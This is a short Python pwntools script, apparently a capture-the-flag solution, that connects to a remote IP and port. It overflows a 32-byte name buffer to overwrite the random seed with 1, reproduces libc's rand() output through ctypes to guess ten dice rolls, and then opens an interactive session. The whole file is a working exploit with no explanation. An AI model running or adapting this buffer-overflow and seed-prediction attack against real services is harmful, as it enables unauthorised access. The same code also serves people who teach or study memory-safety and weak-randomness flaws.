from pwn import *
from ctypes import *
p = remote('220.249.52.133','59085')

payload = 'a'*(0x20) + p64(1)

p.sendlineafter('name:',payload)
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(1)
for i in range(10):
    p.recvuntil('number:')
    p.sendline(str(libc.rand()%6+1))


p.interactive()
